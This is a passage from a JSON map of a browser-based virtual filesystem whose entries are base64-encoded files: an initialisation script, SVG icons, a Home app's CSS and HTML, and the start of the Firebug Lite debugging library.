lKDEwMCk7DQogICAgICByb290ID0gZmlsZVN5c3RlbS5yb290Ow0KICAgICAgZnNMb2coJ2ZpbGVTeXN0ZW0uanM6IEZpbGUgU3lzdGVtIEluaXRpYWxpemVkLicpOw0KICAgIH0sIGZ1bmN0aW9uKGVycikgew0KICAgICAgZnNFcnJvcignZmlsZVN5c3RlbS5qczogQ2Fubm90IGdldCBGaWxlIFN5c3RlbS4nLCBlcnIpOw0KICAgIH0pOw0KICB9LCBmdW5jdGlvbihlcnIpIHsNCiAgICBmc0Vycm9yKCdmaWxlU3lzdGVtLmpzOiBDYW5ub3QgcmVxdWVzdCBGaWxlIFN5c3RlbS4nLCBlcnIpOw0KICB9KTsNCiAgbG9hZGluZ1NjcmVlbi5zZXRNZXNzYWdlKCdGaWxlIFBhcnNlZCEnKTsNCiAgbG9hZGluZ1NjcmVlbi5zZXRQZXJjZW50YWdlKDUwKTsNCn0pKCk7DQovKg0KZnMuZ2V0UmVzb3VyY2UoKQ0KKi8NCg==", "/system/res/drawable/deleteFileDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz4NCiAgICA8cGF0aCBkPSJNNiAxOWMwIDEuMS45IDIgMiAyaDhjMS4xIDAgMi0uOSAyLTJWN0g2djEyem0yLjQ2LTcuMTJsMS40MS0xLjQxTDEyIDEyLjU5bDIuMTItMi4xMiAxLjQxIDEuNDFMMTMuNDEgMTRsMi4xMiAyLjEyLTEuNDEgMS40MUwxMiAxNS40MWwtMi4xMiAyLjEyLTEuNDEtMS40MUwxMC41OSAxNGwtMi4xMy0yLjEyek0xNS41IDRsLTEtMWgtNWwtMSAxSDV2MmgxNFY0eiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/app/Home/res/stylesheet.css": "LypHbG9iYWwgU3R5bGVzKi8NCkBmb250LWZhY2Ugew0KICBmb250LWZhbWlseTogJ1JvYm90byc7DQogIGZvbnQtc3R5bGU6IG5vcm1hbDsNCiAgZm9udC13ZWlnaHQ6IDQwMDsNCiAgc3JjOnVybCgnLy9zeXN0ZW0vZm9udHMvcm9ib3RvLndvZmYyJykgZm9ybWF0KCd3b2ZmMicpOw0KICB1bmljb2RlLXJhbmdlOiBVKzAwMDAtMDBGRiwgVSswMTMxLCBVKzAxNTItMDE1MywgVSswMkM2LCBVKzAyREEsIFUrMDJEQywgVSsyMDAwLTIwNkYsIFUrMjA3NCwgVSsyMEFDLCBVKzIyMTIsIFUrMjIxNSwgVStFMEZGLCBVK0VGRkQsIFUrRjAwMDsNCn0NCiogew0KICAta2h0bWwtdXNlci1kcmFnOiBub25lOw0KICAtbW96LXVzZXItZHJhZzogbm9uZTsNCiAgLXdlYmtpdC11c2VyLWRyYWc6IG5vbmU7DQogIC1vLXVzZXItZHJhZzogbm9uZTsNCn0NCmJvZHkgew0KICAtbW96LXVzZXItc2VsZWN0OiBub25lOw0KICAtbXMtdXNlci1zZWxlY3Q6IG5vbmU7DQogIC13ZWJraXQtdG91Y2gtY2FsbG91dDogbm9uZTsNCiAgLXdlYmtpdC11c2VyLXNlbGVjdDogbm9uZTsNCiAgYmFja2dyb3VuZDogI2VlZWRlZDsNCiAgZm9udC1mYW1pbHk6ICdSb2JvdG8nLCBzYW5zLXNlcmlmOw0KICBtYXJnaW46IDA7DQogIHVzZXItc2VsZWN0OiBub25lOw0KfQ0KLmNlbnRlclZlcnRpY2FsIHsNCiAgZGlzcGxheTogZmxleDsNCiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQp9DQoNCi8qR2xvYmFsIENhcmQgU3R5bGVzKi8NCjo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICB3aWR0aDogMXZ3Ow0KfQ0KOjotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7DQogIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgLjIpOw0KfQ0KOjotd2Via2l0LXNjcm9sbGJhci10cmFjayB7DQogIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgLjEpOw0KfQ0KLmNhcmRTZWN0aW9uIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7DQogIGJvcmRlci1yYWRpdXM6IDEuNXZtYXg7DQogIGN1cnNvcjogZGVmYXVsdDsNCiAgbWFyZ2luOiAydmggMXZ3IDJ2aCAxdnc7DQogIG1heC13aWR0aDogMjl2dzsNCiAgbWluLWhlaWdodDogMjV2aDsNCiAgb3ZlcmZsb3cteDogaGlkZGVuOw0KICBwYWRkaW5nLWJvdHRvbTogMS41dmg7DQogIHBhZGRpbmctdG9wOiAxLjV2aDsNCiAgcG9zaXRpb246IGFic29sdXRlOw0KICB3aWR0aDogMjd2dzsNCn0NCi5jYXJkU2VjdGlvbiAuc2VjdGlvbkhlYWRlciB7DQogIGJvcmRlci1ib3R0b206IHJnYmEoMCwgMCwgMCwgLjEpIHNvbGlkIDFweDsNCiAgcGFkZGluZy1ib3R0b206IDF2aDsNCn0NCi5jYXJkU2VjdGlvbiAuc2VjdGlvbkhlYWRlciBwIHsNCiAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogIG1hcmdpbjogMDsNCiAgbWFyZ2luLWxlZnQ6IDJ2dzsNCiAgdGV4dC10cmFuc2Zvcm06IGNhcGl0YWxpemU7DQp9DQouY2FyZFNlY3Rpb24gLnNlY3Rpb25IZWFkZXIgZGl2IHsNCiAgbWFyZ2luOiAwOw0KICBtYXJnaW4tcmlnaHQ6IDJ2dzsNCiAgcGFkZGluZy1yaWdodDogMXZ3Ow0KICB0ZXh0LXRyYW5zZm9ybTogY2FwaXRhbGl6ZTsNCn0NCi5jYXJkU2VjdGlvbiAuYm9keSB7DQogIG1hcmdpbi1sZWZ0OiAydnc7DQogIG1hcmdpbi1yaWdodDogMnZ3Ow0KICBtYXJnaW4tdG9wOiAxLjV2aDsNCiAgbWF4LWhlaWdodDogNTB2aDsNCiAgb3ZlcmZsb3cteTogYXV0bzsNCn0NCi5jYXJkU2VjdGlvbiAubG9hZGluZyB7DQogIG1hcmdpbi10b3A6IDA7DQp9DQoNCi8qQXBwIENhcmQgU3R5bGVzKi8NCi5hcHBMaXN0SXRlbSB7DQogIGJvcmRlci1ib3R0b206IHJnYmEoMCwgMCwgMCwgMC4xKSBzb2xpZCAxcHg7DQogIGhlaWdodDogNnZoOw0KICBtYXgtaGVpZ2h0OiA2dmg7DQogIG92ZXJmbG93OiBoaWRkZW47DQogIGRpc3BsYXk6IGZsZXg7DQp9DQouYXBwTGlzdEl0ZW0gLmNlbnRlclZlcnRpY2FsIC5pY29Db250YWluZXIgew0KICBoZWlnaHQ6IDV2aDsNCiAgd2lkdGg6IDV2aDsNCiAgbWF4LXdpZHRoOiA1dmg7DQogIG1heC1oZWlnaHQ6IDV2aDsNCiAgcG9zaXRpb246IHJlbGF0aXZlOw0KfQ0KLmFwcExpc3RJdGVtIC5jZW50ZXJWZXJ0aWNhbCAuaWNvQ29udGFpbmVyIGltZ3sNCiAgaGVpZ2h0OiA1dmg7DQogIHdpZHRoOiA1dmg7DQogIG1heC13aWR0aDogNXZoOw0KICBtYXgtaGVpZ2h0OiA1dmg7DQogIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCn0NCi5hcHBMaXN0SXRlbSAuY2VudGVyVmVydGljYWwgLmljb0NvbnRhaW5lciBpbWcubGF1bmNoYWJsZSB7DQogIG9wYWNpdHk6IDE7DQogIHRyYW5zaXRpb246IG9wYWNpdHkgLjM1cyBlYXNlLWluLW91dDsNCn0NCi5hcHBMaXN0SXRlbSAuY2VudGVyVmVydGljYWwgLmljb0NvbnRhaW5lcjpob3ZlciBpbWcubGF1bmNoYWJsZSB7DQogIG9wYWNpdHk6IDA7DQp9DQouYXBwTGlzdEl0ZW0gLmNlbnRlclZlcnRpY2FsIC5pY29Db250YWluZXIgaW1nLmxhdW5jaEljbyB7DQogIGN1cnNvcjogcG9pbnRlcjsNCiAgb3BhY2l0eTogMDsNCiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuMzVzIGVhc2UtaW4tb3V0Ow0KfQ0KLmFwcExpc3RJdGVtIC5jZW50ZXJWZXJ0aWNhbCAuaWNvQ29udGFpbmVyOmhvdmVyIGltZy5sYXVuY2hJY28gew0KICBvcGFjaXR5OiAxOw0KfQ0KLmFwcExpc3RJdGVtIC5jZW50ZXJWZXJ0aWNhbCBwIHsNCiAgcGFkZGluZy1sZWZ0OiAydnc7DQp9DQo=", "/system/res/drawable/checkDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0yIDE1bC01LTUgMS40MS0xLjQxTDEwIDE0LjE3bDcuNTktNy41OUwxOSA4bC05IDl6Ii8+DQo8L3N2Zz4=", "/system/res/drawable/pause.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNNiAxOWg0VjVINnYxNHptOC0xNHYxNGg0VjVoLTR6Ii8+DQogICAgPHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPg0KPC9zdmc+", "/system/res/drawable/downloadDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTkgOWgtNFYzSDl2Nkg1bDcgNyA3LTd6TTUgMTh2MmgxNHYtMkg1eiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/downloadLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMTkgOWgtNFYzSDl2Nkg1bDcgNyA3LTd6TTUgMTh2MmgxNHYtMkg1eiIvPg0KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4NCjwvc3ZnPg==", "/system/res/drawable/stopLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTYgNmgxMnYxMkg2eiIvPg0KPC9zdmc+", "/system/res/drawable/settingsDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTE5LjQzIDEyLjk4Yy4wNC0uMzIuMDctLjY0LjA3LS45OHMtLjAzLS42Ni0uMDctLjk4bDIuMTEtMS42NWMuMTktLjE1LjI0LS40Mi4xMi0uNjRsLTItMy40NmMtLjEyLS4yMi0uMzktLjMtLjYxLS4yMmwtMi40OSAxYy0uNTItLjQtMS4wOC0uNzMtMS42OS0uOThsLS4zOC0yLjY1QzE0LjQ2IDIuMTggMTQuMjUgMiAxNCAyaC00Yy0uMjUgMC0uNDYuMTgtLjQ5LjQybC0uMzggMi42NWMtLjYxLjI1LTEuMTcuNTktMS42OS45OGwtMi40OS0xYy0uMjMtLjA5LS40OSAwLS42MS4yMmwtMiAzLjQ2Yy0uMTMuMjItLjA3LjQ5LjEyLjY0bDIuMTEgMS42NWMtLjA0LjMyLS4wNy42NS0uMDcuOThzLjAzLjY2LjA3Ljk4bC0yLjExIDEuNjVjLS4xOS4xNS0uMjQuNDItLjEyLjY0bDIgMy40NmMuMTIuMjIuMzkuMy42MS4yMmwyLjQ5LTFjLjUyLjQgMS4wOC43MyAxLjY5Ljk4bC4zOCAyLjY1Yy4wMy4yNC4yNC40Mi40OS40Mmg0Yy4yNSAwIC40Ni0uMTguNDktLjQybC4zOC0yLjY1Yy42MS0uMjUgMS4xNy0uNTkgMS42OS0uOThsMi40OSAxYy4yMy4wOS40OSAwIC42MS0uMjJsMi0zLjQ2Yy4xMi0uMjIuMDctLjQ5LS4xMi0uNjRsLTIuMTEtMS42NXpNMTIgMTUuNWMtMS45MyAwLTMuNS0xLjU3LTMuNS0zLjVzMS41Ny0zLjUgMy41LTMuNSAzLjUgMS41NyAzLjUgMy41LTEuNTcgMy41LTMuNSAzLjV6Ii8+DQo8L3N2Zz4=", "/system/app/FireBug/res/drawable": {}, "/system/app/Home/index.html": "PCFkb2N0eXBlIGh0bWw+DQo8aHRtbD4NCgk8aGVhZD4NCgkJPHRpdGxlPkhvbWU8L3RpdGxlPg0KCQk8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJyZXMvc3R5bGVzaGVldC5jc3MiPg0KCTwvaGVhZD4NCgk8Ym9keT4NCgkJPHNjcmlwdCBzcmM9InNjcmlwdC9hcHAuanMiPjwvc2NyaXB0Pg0KCTwvYm9keT4NCjwvaHRtbD4=", "/system/app/Home": {}, "/system/app/Exploit": {}, "/system/res/drawable/cloudDisconnectedDark.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTE5LjM1IDEwLjA0QzE4LjY3IDYuNTkgMTUuNjQgNCAxMiA0Yy0xLjQ4IDAtMi44NS40My00LjAxIDEuMTdsMS40NiAxLjQ2QzEwLjIxIDYuMjMgMTEuMDggNiAxMiA2YzMuMDQgMCA1LjUgMi40NiA1LjUgNS41di41SDE5YzEuNjYgMCAzIDEuMzQgMyAzIDAgMS4xMy0uNjQgMi4xMS0xLjU2IDIuNjJsMS40NSAxLjQ1QzIzLjE2IDE4LjE2IDI0IDE2LjY4IDI0IDE1YzAtMi42NC0yLjA1LTQuNzgtNC42NS00Ljk2ek0zIDUuMjdsMi43NSAyLjc0QzIuNTYgOC4xNSAwIDEwLjc3IDAgMTRjMCAzLjMxIDIuNjkgNiA2IDZoMTEuNzNsMiAyTDIxIDIwLjczIDQuMjcgNCAzIDUuMjd6TTcuNzMgMTBsOCA4SDZjLTIuMjEgMC00LTEuNzktNC00czEuNzktNCA0LTRoMS43M3oiLz4NCjwvc3ZnPg==", "/system/app/FireBug/res/firebug-lite-beta.js": "KGZ1bmN0aW9uKCl7DQoNCi8qISoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAqDQogKiAgICBGaXJlYnVnIExpdGUgMS40LjANCiAqIA0KICogICAgICBDb3B5cmlnaHQgKGMpIDIwMDcsIFBhcmFrZXkgSW5jLg0KICogICAgICBSZWxlYXNlZCB1bmRlciBCU0QgbGljZW5zZS4NCiAqICAgICAgTW9yZSBpbmZvcm1hdGlvbjogaHR0cDovL2dldGZpcmVidWcuY29tL2ZpcmVidWdsaXRlDQogKiAgDQogKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQoNCi8qIQ0KICogQ1NTIHNlbGVjdG9ycyBwb3dlcmVkIGJ5Og0KICogDQogKiBTaXp6bGUgQ1NTIFNlbGVjdG9yIEVuZ2luZSAtIHYxLjANCiAqICBDb3B5cmlnaHQgMjAwOSwgVGhlIERvam8gRm91bmRhdGlvbg0KICogIFJlbGVhc2VkIHVuZGVyIHRoZSBNSVQsIEJTRCwgYW5kIEdQTCBMaWNlbnNlcy4NCiAqICBNb3JlIGluZm9ybWF0aW9uOiBodHRwOi8vc2l6emxlanMuY29tLw0KICovDQoNCi8qKiBAbmFtZXNwYWNlIGRlc2NyaWJlIGxpYiAqLw0KDQovLyBGSVhNRTogeHh4cGVkcm8gaWYgd2UgdXNlICJ2YXIgRkJMID0ge30iIHRoZSBGQkwgd29uJ3QgYXBwZWFyIGluIHRoZSBET00gUGFuZWwgaW4gSUUgDQp2YXIgRkJMID0ge307DQoNCiggLyoqIEBzY29wZSBzX2xpYiBAdGhpcyBGQkwgKi8gZnVuY3Rpb24oKSB7DQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDb25zdGFudHMNCiAgICANCnZhciBwcm9kdWN0aW9uRGlyID0gImh0dHA6Ly9nZXRmaXJlYnVnLmNvbS9yZWxlYXNlcy9saXRlLyI7DQp2YXIgYm9va21hcmtsZXRWZXJzaW9uID0gNDsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnZhciByZU5vdFdoaXRlc3BhY2UgPSAvW15cc10vOw0KdmFyIHJlU3BsaXRGaWxlID0gLzpcL3sxLDN9KC4qPylcLyhbXlwvXSo/KVwvPygkfFw/LiopLzsNCg0KLy8gR2xvYmFscw0KdGhpcy5yZUphdmFzY3JpcHQgPSAvXHMqamF2YXNjcmlwdDpccyooLiopLzsNCnRoaXMucmVDaHJvbWUgPSAvY2hyb21lOlwvXC8oW15cL10qKVwvLzsNCnRoaXMucmVGaWxlID0gL2ZpbGU6XC9cLyhbXlwvXSopXC8vOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gcHJvcGVydGllcw0KDQp2YXIgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOw0KdGhpcy5pc0ZpcmVmb3ggPSAvZmlyZWZveC8udGVzdCh1c2VyQWdlbnQpOw0KdGhpcy5pc09wZXJhICAgPSAvb3BlcmEvLnRlc3QodXNlckFnZW50KTsNCnRoaXMuaXNTYWZhcmkgID0gL3dlYmtpdC8udGVzdCh1c2VyQWdlbnQpOw0KdGhpcy5pc0lFICAgICAgPSAvbXNpZS8udGVzdCh1c2VyQWdlbnQpICYmICEvb3BlcmEvLnRlc3QodXNlckFnZW50KTsNCnRoaXMuaXNJRTYgICAgID0gL21zaWUgNi9pLnRlc3QobmF2aWdhdG9yLmFwcFZlcnNpb24pOw0KdGhpcy5icm93c2VyVmVyc2lvbiA9ICh1c2VyQWdlbnQubWF0Y2goIC8uKyg/OnJ2fGl0fHJhfGllKVtcLzogXShbXGQuXSspLyApIHx8IFswLCcwJ10pWzFdOw0KdGhpcy5pc0lFbHQ4ICAgPSB0aGlzLmlzSUUgJiYgKHRoaXMuYnJvd3NlclZlcnNpb24tMCA8IDgpOyANCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdGhpcy5OUyA9IG51bGw7DQp0aGlzLnBpeGVsc1BlckluY2ggPSBudWxsOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gTmFtZXNwYWNlcw0KDQp2YXIgbmFtZXNwYWNlcyA9IFtdOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp0aGlzLm5zID0gZnVuY3Rpb24oZm4pDQp7DQogICAgdmFyIG5zID0ge307DQogICAgbmFtZXNwYWNlcy5wdXNoKGZuLCBucyk7DQogICAgcmV0dXJuIG5zOw0KfTsNCg0KdmFyIEZCVHJhY2UgPSBudWxsOw0KDQp0aGlzLmluaXRpYWxpemUgPSBmdW5jdGlvbigpDQp7DQogICAgLy8gRmlyZWJ1ZyBMaXRlIGlzIGFscmVhZHkgcnVubmluZyBpbiBwZXJzaXN0ZW50IG1vZGUgc28gd2UganVzdCBxdWl0DQogICAgaWYgKHdpbmRvdy5maXJlYnVnICYmIGZpcmVidWcuZmlyZWJ1Z2xpdGUgfHwgd2luZG93LmNvbnNvbGUgJiYgY29uc29sZS5maXJlYnVnbGl0ZSkNCiAgICAgICAgcmV0dXJuOw0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiANCiAgICAvLyBpbml0aWFsaXplIGVudmlyb25tZW50DQoNCiAgICAvLyBwb2ludCB0aGUgRkJUcmFjZSBvYmplY3QgdG8gdGhlIGxvY2FsIHZhcmlhYmxlDQogICAgaWYgKEZCTC5GQlRyYWNlKQ0KICAgICAgICBGQlRyYWNlID0gRkJMLkZCVHJhY2U7DQogICAgZWxzZQ0KICAgICAgICBGQlRyYWNlID0gRkJMLkZCVHJhY2UgPSB7fTsNCiAgICANCiAgICAvLyBjaGVjayBpZiB0aGUgYWN0dWFsIHdpbmRvdyBpcyBhIHBlcnNpc3RlZCBjaHJvbWUgY29udGV4dA0KICAgIHZhciBpc0Nocm9tZUNvbnRleHQgPSB3aW5kb3cuRmlyZWJ1ZyAmJiB0eXBlb2Ygd2luZG93LkZpcmVidWcuU2hhcmVkRW52ID09ICJvYmplY3QiOw0KICAgIA0KICAgIC8vIGNocm9tZSBjb250ZXh0IG9mIHRoZSBwZXJzaXN0ZW50IGFwcGxpY2F0aW9uDQogICAgaWYgKGlzQ2hyb21lQ29udGV4dCkNCiAgICB7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIHBlcnNpc3QgLSBtYWtlIGEgYmV0dGVyIHN5bmNocm9uaXphdGlvbg0KICAgICAgICBzaGFyZWRFbnYgPSB3aW5kb3cuRmlyZWJ1Zy5TaGFyZWRFbnY7DQogICAgICAgIGRlbGV0ZSB3aW5kb3cuRmlyZWJ1Zy5TaGFyZWRFbnY7DQogICAgICAgIA0KICAgICAgICBGQkwuRW52ID0gc2hhcmVkRW52Ow0KICAgICAgICBGQkwuRW52LmlzQ2hyb21lQ29udGV4dCA9IHRydWU7DQogICAgICAgIEZCVHJhY2UubWVzc2FnZVF1ZXVlID0gRkJMLkVudi50cmFjZU1lc3NhZ2VRdWV1ZTsNCiAgICB9DQogICAgLy8gbm9uLXBlcnNpc3RlbnQgYXBwbGljYXRpb24NCiAgICBlbHNlDQogICAgew0KICAgICAgICBGQkwuTlMgPSBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubmFtZXNwYWNlVVJJOw0KICAgICAgICBGQkwuRW52LmJyb3dzZXIgPSB3aW5kb3c7DQogICAgICAgIEZCTC5FbnYuZGVzdHJveSA9IGRlc3Ryb3lFbnZpcm9ubWVudDsNCg0KICAgICAgICBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmdldEF0dHJpYnV0ZSgiZGVidWciKSA9PSAidHJ1ZSIpDQogICAgICAgICAgICBGQkwuRW52Lk9wdGlvbnMuc3RhcnRPcGVuZWQgPSB0cnVlOw0KDQogICAgICAgIC8vIGZpbmQgdGhlIFVSTCBsb2NhdGlvbiBvZiB0aGUgbG9hZGVkIGFwcGxpY2F0aW9uDQogICAgICAgIGZpbmRMb2NhdGlvbigpOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogZ2V0IHByZWZlcmVuY2VzIGhlcmUuLi4NCiAgICAgICAgLy8gVGhlIHByb2JsZW0gaXMgdGhhdCB3ZSBkb24ndCBoYXZlIHRoZSBGaXJlYnVnIG9iamVjdCB5ZXQsIHNvIHdlIGNhbid0IHVzZSANCiAgICAgICAgLy8gRmlyZWJ1Zy5sb2FkUHJlZnMuIFdlJ3JlIHVzaW5nIHRoZSBTdG9yZSBtb2R1bGUgZGlyZWN0bHkgaW5zdGVhZC4NCiAgICAgICAgdmFyIHByZWZzID0gRkJMLlN0b3JlLmdldCgiRmlyZWJ1Z0xpdGUiKSB8fCB7fTsNCiAgICAgICAgRkJMLkVudi5EZWZhdWx0T3B0aW9ucyA9IEZCTC5FbnYuT3B0aW9uczsNCiAgICAgICAgRkJMLkVudi5PcHRpb25zID0gRkJMLmV4dGVuZChGQkwuRW52Lk9wdGlvbnMsIHByZWZzLm9wdGlvbnMgfHwge30pOw0KICAgICAgICANCiAgICAgICAgaWYgKEZCTC5pc0ZpcmVmb3ggJiYgDQogICAgICAgICAgICB0eXBlb2YgRkJMLkVudi5icm93c2VyLmNvbnNvbGUgPT0gIm9iamVjdCIgJiYgDQogICAgICAgICAgICBGQkwuRW52LmJyb3dzZXIuY29uc29sZS5maXJlYnVnICYmDQogICAgICAgICAgICBGQkwuRW52Lk9wdGlvbnMuZGlzYWJsZVdoZW5GaXJlYnVnQWN0aXZlKQ0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgLy8gZXhwb3NlcyB0aGUgRkJMIHRvIHRoZSBnbG9iYWwgbmFtZXNwYWNlIHdoZW4gaW4gZGVidWcgbW9kZQ0KICAgIGlmIChGQkwuRW52LmlzRGVidWdNb2RlKQ0KICAgIHsNCiAgICAgICAgRkJMLkVudi5icm93c2VyLkZCTCA9IEZCTDsNCiAgICB9DQogICAgDQogICAgLy8gY2hlY2sgYnJvd3NlciBjb21wYXRpYmlsaXRpZXMNCiAgICB0aGlzLmlzUXVpa3NNb2RlID0gRkJMLkVudi5icm93c2VyLmRvY3VtZW50LmNvbXBhdE1vZGUgPT0gIkJhY2tDb21wYXQiOw0KICAgIHRoaXMuaXNJRVF1aWtzTW9kZSA9IHRoaXMuaXNJRSAmJiB0aGlzLmlzUXVpa3NNb2RlOw0KICAgIHRoaXMuaXNJRVN0YW50YW5kTW9kZSA9IHRoaXMuaXNJRSAmJiAhdGhpcy5pc1F1aWtzTW9kZTsNCiAgICANCiAgICB0aGlzLm5vRml4ZWRQb3NpdGlvbiA9IHRoaXMuaXNJRTYgfHwgdGhpcy5pc0lFUXVpa3NNb2RlOw0KICAgIA0KICAgIC8vIGFmdGVyIGNyZWF0aW5nL3N5bmNocm9uaXppbmcgdGhlIGVudmlyb25tZW50LCBpbml0aWFsaXplIHRoZSBGQlRyYWNlIG1vZHVsZQ0KICAgIGlmIChGQkwuRW52Lk9wdGlvbnMuZW5hYmxlVHJhY2UpIEZCVHJhY2UuaW5pdGlhbGl6ZSgpOw0KICAgIA0KICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFICYmIGlzQ2hyb21lQ29udGV4dCkgRkJUcmFjZS5zeXNvdXQoIkZCTC5pbml0aWFsaXplIC0gcGVyc2lzdGVudCBhcHBsaWNhdGlvbiIsICJpbml0aWFsaXplIGNocm9tZSBjb250ZXh0Iik7DQogICAgICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiANCiAgICAvLyBpbml0aWFsaXplIG5hbWVzcGFjZXMNCg0KICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRkJMLmluaXRpYWxpemUiLCBuYW1lc3BhY2VzLmxlbmd0aC8yKyIgbmFtZXNwYWNlcyBCRUdJTiIpOw0KICAgIA0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbmFtZXNwYWNlcy5sZW5ndGg7IGkgK